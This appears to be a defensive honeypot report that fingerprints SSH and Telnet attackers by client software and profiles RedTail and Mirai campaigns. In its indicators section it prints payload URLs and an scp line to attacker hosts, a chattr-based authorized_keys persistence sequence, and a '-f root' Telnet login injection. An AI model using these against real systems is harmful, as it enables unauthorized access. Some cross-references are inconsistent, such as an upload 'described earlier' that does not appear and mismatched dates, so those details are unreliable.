# SSH and Telnet Honeypot Analysis — Identifying Attackers by Their Client Software

This report covers five days of data from a single T-Pot honeypot sensor. A
honeypot is a machine that is exposed to the internet on purpose, so that
attacks against it can be recorded safely. The report answers one question:
**how many separate attackers are really behind the traffic?**

The short answer is that there are far fewer than the raw numbers suggest. The sensor recorded 50,345 sessions — 46,552 over SSH and 3,793 over Telnet — from thousands of different addresses, but those sessions come from only about six different attack tools. Three of those
tools produce 86% of all sessions. If you rank the data by source address, you
appear to face dozens of separate attackers. If you rank it by the fingerprint
of the software they run, you see a handful of operators, and each one works in
a clearly different way.

---

## Executive summary

This section is written for readers who do not work in security. The rest of
the report assumes technical knowledge.

**What was done.** One machine was connected to the internet for five days in
August 2026 and left to be attacked. It was not a real server. It only
pretended to be one, and it recorded every action taken against it.

**How much arrived.** The machine recorded roughly 762,000 attacks in total.
About a third of them, some 243,000, were attempts to log in over SSH and
Telnet. Those two services are the subject of this report, because they are the
normal way to take remote control of a Linux machine.

**The main finding.** Thousands of different internet addresses attacked the
machine, so at first sight there appear to be thousands of attackers. There are
not. Every attack tool leaves a signature in the way it opens a connection,
much as different makes of car leave different tyre tracks. When the traffic is
grouped by that signature instead of by address, nearly all of it collapses
into about six tools. Three of those tools account for 86% of it.

**Why this matters.** Blocking individual addresses gives weak protection,
because an operator can move to a new address whenever they choose. One group
in this data used twelve addresses spread across four separate address ranges.
Blocking the largest single range would have stopped four of the twelve. Even
blocking the whole network operator behind most of them — three of those four
ranges at once — would have stopped only eight. Blocking the software signature
would have stopped all twelve, wherever they moved next.

Four points are worth drawing out:

- **A quarter of the traffic was not an attack at all.** It came from Modat
  B.V., a company registered in the Netherlands that scans the whole internet
  and sells the results. Counting it as hostile would overstate the threat by
  about 25%.
- **One group tested the machine, worked out that it was a trap, and left.**
  They connected 32 times, inspected the system each time, and never installed
  anything.
- **One group did not test at all.** It installed malware immediately, in seven
  files built for five different processor types.
- **A second, unrelated criminal group used the same front door.** On the final
  day another operator logged in and installed a different kind of malware —
  one built to launch attacks against other people's systems rather than to
  mine currency. It arrived the same way, by guessing a weak password.

### Attack volume by sensor

![Bar chart of attacks recorded by each honeypot sensor between 13 and 17 August 2026. Honeytrap 303k, Cowrie 243k, RDPHoneypot 153k, Sentrypeer 36k, Dionaea 14k, Honeyaml 5k, Tanner 2k, ConPot 2k, Heralding 1k and H0neytr4p 1k, from a total of 762k.](../docs/images/honeypot-attacks-by-sensor.svg)

*Attacks recorded by each sensor over the five-day window, taken from the T-Pot
dashboard totals. Cowrie, shown in blue, handles SSH and Telnet and is the
source for every finding in this report.*

---

## Read this before the numbers

Modat's scanning is almost entirely absent from Cowrie: 13 sessions out of 50,345, none of which attempted a login. Their 192,636 events fall under other sensors, chiefly Honeytrap. Every finding below is therefore drawn from data that commercial scanning does not meaningfully affect. Where the 762k figure appears, it means all recorded events across all sensors, scanning included.

| Sensor | Events | Share |
|---|---|---|
| Cowrie | 243k | 31.9% |
| Others | 519k | 68.1% |
| **Total** | **762k** | |

Counts are rounded to the nearest thousand. *Others* combines the nine
remaining honeypot sensors: Honeytrap, RDPHoneypot, Sentrypeer, Dionaea,
Honeyaml, Tanner, ConPot, Heralding and H0neytr4p.

---

## Finding 1 — A quarter of the traffic is a commercial scanning company

The largest single source, once addresses are grouped by network operator
(ASN), is **Modat B.V. (AS209334)**, with 192,636 events. That is about 25% of
all attacks recorded in the window. Modat is a company registered in the
Netherlands. It scans the whole internet and sells the results as commercial
intelligence.

On 13 August, all ten of the busiest Honeytrap sources belonged to
`85.217.149.0/24`, a block of addresses assigned to AS209334:

```
85.217.149.12  13,751     85.217.149.42   7,904
85.217.149.40  11,139     85.217.149.30   7,444
85.217.149.35   9,643     85.217.149.13   7,178
85.217.149.26   9,473     85.217.149.27   6,017
85.217.149.22   9,390     85.217.149.11   5,782
```


---

## Finding 2 — Six tools account for 90% of the traffic

HASSH is a fingerprint of the way an SSH client negotiates encryption settings
at the start of a connection. It identifies the software in use, not the
machine that runs it. Counted across all sessions:

| HASSH | Events | Share |
|---|---|---|
| `98ddc5604ef6a1006a2b49a58759fbe6` | 31,827 | 63% |
| `0a07365cc01fa9fc82608ba4019af499` | 7,422 | 15% |
| `16443846184eafde36765c9bab2f4397` | 3,956 | 8% |
| `2ec37a7cc8daf20b10e1ad6221061ca5` | 1,545 | 3% |
| `01ca35584ad5a1b66cf6a9846b5b2821` | 455 | |
| `3356ae6145fa86124298066e281ea2d9` | 163 | |

After these six, the counts fall immediately to double and single figures.

---

## Finding 3 — Work queues split into exactly equal shares

Counting **separate sessions** for each fingerprint, rather than events, shows
that the work was divided up deliberately.

`0a07365cc01fa9fc82608ba4019af499` — six hosts, each with the same number of
sessions:

```
45.153.34.114   772        77.239.124.241   772
45.153.34.151   772        77.239.124.247   772
45.153.34.167   772        77.239.124.250   772
```

`16443846184eafde36765c9bab2f4397` — seven hosts, again with identical counts:

```
91.92.40.23  429    91.92.40.44  429    91.92.40.46  429
91.92.40.31  429    91.92.40.45  429    91.92.40.48  429
91.92.40.43  429
```

Identical totals across hosts that are supposed to be independent do not occur
by chance. A list of targets was divided into equal parts and handed to each
worker.

The behaviour of fleet `0a07365c` is pure password guessing. Across 772
sessions from `77.239.124.250`, only six commands were typed in total, and all
six were `uname -s -v -n -r -m`. More than 99% of its sessions never reached a
command prompt at all.

Registry records for the address ranges involved:

```
AS197170   45.153.34.0/24    DE
AS197170   91.92.40.0/24     BG
AS198364   77.239.124.0/24   US (RIPE-registered)
```

`45.153.34.0/24` and `91.92.40.0/24` belong to the same network operator, even
though they are registered in different countries. Addresses from both ranges
also appear under **both** fingerprints. This data cannot show whether one
operator runs two tools, or whether a shared hosting provider serves two
different customers.

---

## Finding 4 — An attacker that detects the honeypot and withdraws

Twelve hosts, spread across four address ranges, all share HASSH
`2ec37a7cc8daf20b10e1ad6221061ca5`. Between 13 and 17 August they ran the same
reconnaissance script in 32 sessions. **None of them installed anything.**

```
193.32.162.15 / .34 / .84        AS47890  RO
92.118.39.14 / .49 / .50 / .71   AS47890  RO
2.57.122.209                     AS47890  RO
195.178.110.217 / .227 / .228 / .232   AS48090  BG
```

The script records the processor type, the CPU model, the number of cores and
the uptime, and it searches the `lspci` output for NVIDIA graphics cards. It
ends with a section labelled `===SHELL_BEHAVIOR===`, which captures the exact
error messages produced by two invalid commands. It then tries to write a small
script, make it executable, run it, and check the output.

That final section is a test for honeypots, and it worked. Consider one typical
session (`7f563a2fe1bb`, from `193.32.162.15`, 17 August at 04:55):

- The script relies on `||` fallback chains. On a real system the first `uname`
  command succeeds and the rest of the chain is skipped. Here **every fallback
  ran in turn**, between 1 and 25 ms apart, and each was logged as a separate
  command.
- `busybox uname` returned `Command not found`, so the script carried on into
  its `/proc/version` and `/etc/os-release` branches.
- In `head -1 /proc/version | cut -d -f1`, the delimiter argument lost its
  space. A real shell does not do this.
- The `===SHELL_BEHAVIOR===` section never ran at all.

The session lasted 7.0 seconds. The terminal log came to 302 bytes. Nothing was
installed.

Across 1,545 connection events from these twelve hosts, the number of files
uploaded was **zero**.

**What this means for defence.** Eight of the twelve hosts sit in three
different address ranges under one operator (AS47890). The other four sit in a
single range under AS48090. Blocking any one range leaves the group free to
work from the others. Blocking the whole of AS47890 catches eight of the
twelve. The client fingerprint catches all twelve, wherever they move.

---

## Finding 5 — Three roles, separated only by behaviour

| | Recon fleet | `195.178.110.137` | RedTail droppers |
|---|---|---|---|
| Hosts | 12 | 1 | 2 |
| Authenticates | yes | yes (13×) | yes |
| Runs commands | always | **never** | yes |
| Delivers payload | **never** | never | 21 uploads (7 unique files) |
| HASSH | `2ec37a7c` | `bf7dbf67` | `16443846` |

`195.178.110.137` logged in thirteen times and typed **no commands at all**.
This fits credential validation, where an operator confirms which username and
password pairs work and records them for a later stage that does the real
damage. It shares an address range with four hosts from the reconnaissance
fleet, but its fingerprint is different. The fingerprint therefore separates
actors; it does not simply repeat what the address range already tells us.

`130.12.180.51` and `77.90.185.20` ran no checks whatsoever. They installed a
payload immediately: seven files, built for five processor types.

**The 21 in the table above counts uploads, not distinct files.** The same
seven files were pushed repeatedly across sessions, which is why the payload
hash table lists seven rows rather than twenty-one. Only one of those sessions —
`c71e5cdb87f1`, on 17 August — falls inside the log window that survived
rotation; `77.90.185.20` does not appear in it at all, so its deliveries sit in
the 13–16 August portion and could not be re-verified.

Both of these hosts share HASSH `16443846` with the fleet of scanners described
above, appearing there with three or four sessions each. Same tool, different
job.

---

### A Mirai-family multi-architecture dropper

The second upload, 6aa5054a…, is a 1,608-byte shell script. Each of its twelve lines fetches a payload from 5.182.210.174, marks it executable, runs it, and deletes it.

Delivery — observed. It arrived on 15 August over telnet from 45.198.224.26, after a successful login. Cowrie fetched it: the attacker's wget command caused a real outbound request to the attacker's own server, and the response was saved. This is the same address and same campaign as the chained download commands described earlier, not a separate event.

Why the twelve payloads were never captured — observed. Cowrie downloads files, but it does not run them. The script was saved to disk and never interpreted, so its twelve fetch lines never executed. The attacker's chain also failed before that point, because it tried to run the script a fraction of a second before the download had finished.

Classification — assessed. VirusTotal flags the file as malicious, 30 of 60 engines, under the threat label trojan.gen2/mirai.

---

### RedTail payload (SHA-256)

| File | SHA-256 | Bytes |
|---|---|---|
| `clean.sh` | `3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892` | 1,157 |
| `setup.sh` | `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | 2,126 |
| `redtail.arm7` | `d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141` | 1,448,252 |
| `redtail.arm8` | `d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e` | 1,696,412 |
| `redtail.i686` | `8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70` | 1,838,060 |
| `redtail.riscv` | `3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39` | 1,759,768 |
| `redtail.x86_64` | `f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987` | 1,989,056 |

Binaries are not included in this repository. Hashes only.

### Payloads captured on 17 August (SHA-256)

| SHA-256 | Bytes | Family | Delivered by |
|---|---|---|---|
| `6aa5054a95d23277df417a5f69cf292e19bc2ef0406bc0c1884935a44e3ce797` | 1,608 | Mirai-family | `45.198.224.26` |

### Persistence technique

```
chattr -ia ~/.ssh/authorized_keys
echo "ssh-rsa AAAA... rsa-key-20230629" > ~/.ssh/authorized_keys
chattr +ai ~/.ssh/authorized_keys
```

The file attributes are cleared first, which defeats any lock set by an earlier
attacker. The key is then written, and the file is marked immutable and
append-only, so that it cannot be changed again without running `chattr -ia`.
The comment on the key, `rsa-key-20230629`, is an identifier that PuTTYgen
created in June 2023, which makes it a stable marker across campaigns.

### Public keys offered for authentication

Two distinct public keys were offered across 50,345 sessions, in four offerings.

| Fingerprint | Sources |
|---|---|
| `71:3a:b0:18:e2:6c:41:18:4e:56:1e:fd:d2:49:97:66` | `195.178.110.137` (×2) |
| `d4:98:c4:f3:12:ef:3e:29:38:34:62:21:fd:99:ec:ef` | `192.42.116.18`, `185.220.101.105` |

The second key came from two addresses that are confirmed Tor exit nodes.
`185.220.101.105` resolves to `tor-exit-105.digitalcourage.de` (AS60729,
Digitalcourage e.V., Berlin) and serves a Tor exit notice on port 80.
`192.42.116.0/24` belongs to AS215125 (NL). Where the network address changes
deliberately, the key is the more reliable identifier.

The first key is a 1024-bit RSA key that uses the old exponent-35 encoding.
This is far older than anything current versions of `ssh-keygen` produce, which
suggests a leaked or vendor-default key being sprayed widely, rather than one
generated for this campaign. **It has not yet been checked against published
lists of compromised keys.**

### Payload retrieval infrastructure

```
http://5.182.210.174/ok
https://217.60.195.113/sh
scp dlr@217.60.195.113:sh
```

The third of these was attempted with a private key that the attacker pasted
directly into the session. That key is therefore recorded in the honeypot logs.

### Telnet argument injection

```json
{"eventid":"cowrie.telnet.exploit_attempt","cve":"CVE-2026-24061",
 "name":"USER","value":"-f root","src_ip":"64.89.163.156",
 "timestamp":"2026-08-17T14:37:37.235363Z"}
```

`-f` is the flag that `login(1)` uses to mark a user as already authenticated.
Passing it through the username field logs the attacker in as root without a
password. This was the **only** attempt to exploit a flaw in the entire
dataset.

---

## Scope

One sensor, five days, passive collection only. Nothing was scanned, probed or
contacted. All enrichment used passive sources: registry records, Team Cymru
DNS, and historical Shodan data.
